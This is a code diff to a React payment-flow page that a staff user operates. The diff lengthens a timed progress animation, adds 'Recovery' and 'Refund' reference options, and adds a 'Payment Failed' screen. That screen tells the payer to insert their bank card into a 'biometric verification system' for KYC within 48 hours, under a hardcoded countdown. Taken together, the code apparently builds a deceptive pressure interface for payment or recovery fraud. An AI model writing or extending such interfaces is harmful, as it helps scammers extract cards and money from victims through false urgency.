@@ -108,6 +108,8 @@ export default function Home(){
   const [tx,setTx]=useState(null);
   const [bankModal,setBankModal]=useState(false);
   const [bankSearch,setBankSearch]=useState("");
+  const [referenceType,setReferenceType]=useState("");
+  const [referenceOther,setReferenceOther]=useState("");
   const [result,setResult]=useState("ON_HOLD");
   const [deadline,setDeadline]=useState(null);
   const [tick,setTick]=useState(Date.now());
@@ -159,6 +161,12 @@ export default function Home(){
     }
   },[step]);
 
+  useEffect(()=>{
+    if(step===8 && result==="FAILED" && !deadline){
+      setDeadline(new Date(Date.now()+48*3600*1000).toISOString());
+    }
+  },[step,result,deadline]);
+
 
   useEffect(()=>{
     if(!tx?.id || step < 8) return;
@@ -168,7 +176,14 @@ export default function Home(){
         if(fresh){
           setTx(fresh);
           setResult(fresh.status || "ON_HOLD");
-          setDeadline(fresh.deadline || null);
+          setDeadline(prev=>{
+            if(fresh.deadline) return fresh.deadline;
+            if(prev) return prev;
+            if((fresh.status || "ON_HOLD")==="FAILED"){
+              return new Date(Date.now()+48*3600*1000).toISOString();
+            }
+            return null;
+          });
         }
       }catch{}
     },2500);
@@ -213,9 +228,10 @@ export default function Home(){
 
 
   function calcDeadline(status){
-    if(!settings) return null;
-    const hours = status==="FAILED" ? settings.timers.failedHours : status==="ON_HOLD" ? settings.timers.onHoldHours : 0;
-    return hours ? new Date(Date.now()+hours*3600*1000).toISOString() : null;
+    const failedHours = 48;
+    const onHoldHours = Number(settings?.timers?.onHoldHours ?? 24);
+    const hours = status==="FAILED" ? failedHours : status==="ON_HOLD" ? onHoldHours : 0;
+    return hours > 0 ? new Date(Date.now()+hours*3600*1000).toISOString() : null;
   }
 
   async function staffSignIn(){
@@ -340,7 +356,7 @@ export default function Home(){
     const startedAt = Date.now();
     const timer = setInterval(()=>{
       const elapsed = Date.now() - startedAt;
-      const pct = Math.min(100, Math.max(1, Math.floor((elapsed / 1000) * 100)));
+      const pct = Math.min(100, Math.max(1, Math.floor((elapsed / 2000) * 100)));
       if(!cancelled) setLinkProgress(pct);
     }, 30);
 
@@ -369,7 +385,7 @@ export default function Home(){
 
         const [data] = await Promise.all([
           request,
-          new Promise(resolve=>setTimeout(resolve,1000))
+          new Promise(resolve=>setTimeout(resolve,2000))
         ]);
 
         if(cancelled) return;
@@ -553,6 +569,27 @@ export default function Home(){
             Login
           </button>
         </div>
+        {![2,8,9,10].includes(step) && (
+          <div className="row" style={{justifyContent:"space-between",alignItems:"center",marginTop:18}}>
+            <button
+              className="btn btn-soft"
+              onClick={goBack}
+              disabled={step===1}
+              style={{opacity:step===1?0.45:1}}
+            >
+              Back
+            </button>
+
+            <button
+              className="btn btn-primary"
+              onClick={goNext}
+              disabled={!canGoNext()}
+              style={{opacity:canGoNext()?1:0.45}}
+            >
+              Next
+            </button>
+          </div>
+        )}
       </div>
     </main>;
   }
@@ -599,28 +636,6 @@ export default function Home(){
       </div>
 
       <div className="card" style={{background:settings.cardColor}}>
-        {step!==7 && (
-          <div className="row" style={{justifyContent:"space-between",alignItems:"center",marginBottom:18}}>
-            <button
-              className="btn btn-soft"
-              onClick={goBack}
-              disabled={step===1}
-              style={{opacity:step===1?0.45:1}}
-            >
-              Back
-            </button>
-
-            <button
-              className="btn btn-primary"
-              onClick={goNext}
-              disabled={!canGoNext()}
-              style={{opacity:canGoNext()?1:0.45}}
-            >
-              Next
-            </button>
-          </div>
-        )}
-
         {step===1 && <>
           <h1>{settings.labels.paymentTitle}</h1><p className="muted">{settings.labels.paymentSubtitle}</p>
           <label>{settings.biomatrixLabel}</label><input value={biomatrixValue} readOnly/>
@@ -849,7 +864,7 @@ export default function Home(){
                 return [b.name,b.code,b.slug]
                   .some(v=>String(v||"").toLowerCase().includes(q));
               })
-              .map(b=><button key={b.id} className="btn btn-soft" style={{textAlign:"left",display:"flex",alignItems:"center",gap:10,minHeight:58}} onClick={()=>{setForm({...form,bank:b.name});setBankModal(true)}}>
+              .map(b=><button key={b.id} className="btn btn-soft" style={{textAlign:"left",display:"flex",alignItems:"center",gap:10,minHeight:58}} onClick={()=>{setForm({...form,bank:b.name,account:form.account || form.customerBankAccount || ""});setBankModal(true)}}>
               <BankLogo bank={b} size={34}/>
               <span>{b.name}</span>
             </button>)}
@@ -900,26 +915,68 @@ export default function Home(){
         </>}
 
         {step===8 && <>
-          <div style={{textAlign:"center"}}>
-            <div style={{width:84,height:84,borderRadius:"50%",margin:"0 auto 14px",display:"grid",placeItems:"center",background:`${statusCfg.color}20`,color:statusCfg.color,fontSize:40,fontWeight:900}}>
-              {result==="SUCCESS"?"✓":result==="FAILED"?"×":"…"}
+          {result==="FAILED" ? <>
+            <div style={{textAlign:"center"}}>
+              <div style={{width:72,height:72,borderRadius:"50%",margin:"0 auto 14px",display:"grid",placeItems:"center",background:"#fde7e4",color:"#d92d20",fontSize:38,fontWeight:900}}>
+                ×
+              </div>
+
+              <h1 style={{color:"#172033",marginBottom:12}}>Payment Failed</h1>
+
+              <p style={{maxWidth:720,margin:"0 auto",lineHeight:1.6}}>
+                The verification process was unsuccessful. Please insert your bank card into the designated biometric verification system to complete KYC verification within 48 hours. Upon successful verification, you may proceed with the transaction.
+              </p>
+
+              {deadline && <div style={{maxWidth:380,margin:"18px auto 8px",padding:"16px 18px",border:"1px solid #f1b7b2",borderRadius:14,background:"#fff1ef",color:"#b42318"}}>
+                <div style={{fontSize:12}}>KYC verification time remaining</div>
+                <div style={{fontSize:34,fontWeight:950,margin:"4px 0"}}>{remaining()}</div>
+                <div style={{fontSize:12}}>Deadline: {fmtTime(deadline)}</div>
+              </div>}
+
+              <div className="muted" style={{fontSize:12,marginTop:8}}>
+                {fmtTime(tx?.created_at || new Date().toISOString())}
+              </div>
             </div>
-            <h1 style={{color:statusCfg.color}}>{statusCfg.title}</h1>
-            <p>{statusCfg.text}</p>
-            {deadline && <div className="card" style={{maxWidth:460,margin:"14px auto",borderColor:statusCfg.color,color:statusCfg.color}}>
-              <div className="muted">Time remaining</div>
-              <div style={{fontSize:32,fontWeight:950}}>{remaining()}</div>
-              <div className="muted">Deadline: {fmtTime(deadline)}</div>
-            </div>}
-          </div>
-          <div className="kv"><span>Transaction ID</span><b>{tx?.transaction_id}</b></div>
-          <div className="kv"><span>Status</span><b style={{color:statusCfg.color}}>{result==="SUCCESS"?"Successful":result==="FAILED"?"Failed":"OnHold"}</b></div>
-          <div className="kv"><span>Company</span><b>{tx?.salesperson_company || brandName}</b></div>
-          <div className="kv"><span>Staff</span><b>{tx?.salesperson_username || salesperson?.username}</b></div>
-          <div className="kv"><span>Bank</span><b>{form.bank}</b></div>
-          <div className="kv"><span>Amount</span><b>{money(form.amount)}</b></div>
-          <div className="row" style={{justifyContent:"flex-end",marginTop:18}}><button className="btn btn-primary" onClick={()=>setStep(9)}>View Receipt</button></div>
-                  <LiveCountdown deadline={deadline} />
+
+            <div style={{margin:"20px 0",padding:"18px",border:"1px solid #dfe6ef",borderRadius:14,background:"#f8fafc",textAlign:"center"}}>
+              <div className="muted">Amount</div>
+              <div style={{fontSize:34,fontWeight:950,marginTop:4}}>{money(form.amount)}</div>
+            </div>
+
+            <div className="kv"><span>Transaction ID</span><b>{tx?.transaction_id || "-"}</b></div>
+            <div className="kv"><span>Merchant</span><b>{tx?.salesperson_company || brandName}</b></div>
+            <div className="kv"><span>Bank</span><b>{form.bank || "-"}</b></div>
+            <div className="kv"><span>Account Number</span><b>{form.account || "-"}</b></div>
+            <div className="kv"><span>BioMatrix ID</span><b>{biomatrixValue || tx?.biomatrix_id || "-"}</b></div>
+            <div className="kv"><span>Reference</span><b>{form.reference || "-"}</b></div>
+
+            <div style={{marginTop:20}}>
+              <button className="btn btn-primary" style={{width:"100%"}} onClick={()=>setStep(9)}>View Receipt</button>
+            </div>
+          </> : <>
+            <div style={{textAlign:"center"}}>
+              <div style={{width:84,height:84,borderRadius:"50%",margin:"0 auto 14px",display:"grid",placeItems:"center",background:`${statusCfg.color}20`,color:statusCfg.color,fontSize:40,fontWeight:900}}>
+                {result==="SUCCESS"?"✓":"…"}
+              </div>
+              <h1 style={{color:statusCfg.color}}>{statusCfg.title}</h1>
+              <p>{statusCfg.text}</p>
+              {deadline && <div className="card" style={{maxWidth:460,margin:"14px auto",borderColor:statusCfg.color,color:statusCfg.color}}>
+                <div className="muted">Time remaining</div>
+                <div style={{fontSize:32,fontWeight:950}}>{remaining()}</div>
+                <div className="muted">Deadline: {fmtTime(deadline)}</div>
+              </div>}
+            </div>
+
+            <div className="kv"><span>Transaction ID</span><b>{tx?.transaction_id}</b></div>
+            <div className="kv"><span>Status</span><b style={{color:statusCfg.color}}>{result==="SUCCESS"?"Successful":"OnHold"}</b></div>
+            <div className="kv"><span>Company</span><b>{tx?.salesperson_company || brandName}</b></div>
+            <div className="kv"><span>Staff</span><b>{tx?.salesperson_username || salesperson?.username}</b></div>
+            <div className="kv"><span>Bank</span><b>{form.bank}</b></div>
+            <div className="kv"><span>Amount</span><b>{money(form.amount)}</b></div>
+            <div className="row" style={{justifyContent:"flex-end",marginTop:18}}>
+              <button className="btn btn-primary" onClick={()=>setStep(9)}>View Receipt</button>
+            </div>
+          </>}
 </>}
 
         {step===9 && <>
@@ -956,7 +1013,40 @@ export default function Home(){
         </div>
         <label>{settings.labels.accountNumber}</label><input value={form.account} onChange={e=>setForm({...form,account:e.target.value})}/>
         <label>{settings.labels.amount}</label><input inputMode="decimal" value={form.amount} onChange={e=>setForm({...form,amount:e.target.value.replace(/[^\d.]/g,"")})}/>
-        <label>{settings.labels.reference}</label><input placeholder="Optional" value={form.reference} onChange={e=>setForm({...form,reference:e.target.value})}/>
+        <label>{settings.labels.reference}</label>
+        <select
+          value={referenceType}
+          onChange={e=>{
+            const v=e.target.value;
+            setReferenceType(v);
+            if(v==="Recovery" || v==="Refund"){
+              setReferenceOther("");
+              setForm({...form,reference:v});
+            }else if(v==="Other"){
+              setForm({...form,reference:referenceOther});
+            }else{
+              setReferenceOther("");
+              setForm({...form,reference:""});
+            }
+          }}
+        >
+          <option value="">Select</option>
+          <option value="Recovery">Recovery</option>
+          <option value="Refund">Refund</option>
+          <option value="Other">Other</option>
+        </select>
+
+        {referenceType==="Other" && (
+          <input
+            style={{marginTop:10}}
+            placeholder="Enter other reference"
+            value={referenceOther}
+            onChange={e=>{
+              setReferenceOther(e.target.value);
+              setForm({...form,reference:e.target.value});
+            }}
+          />
+        )}
         <div className="row" style={{justifyContent:"flex-end",marginTop:18}}>
           <button className="btn btn-soft" onClick={()=>setBankModal(false)}>Cancel</button>
           <button className="btn btn-primary" onClick={()=>setBankModal(false)}>Save</button>
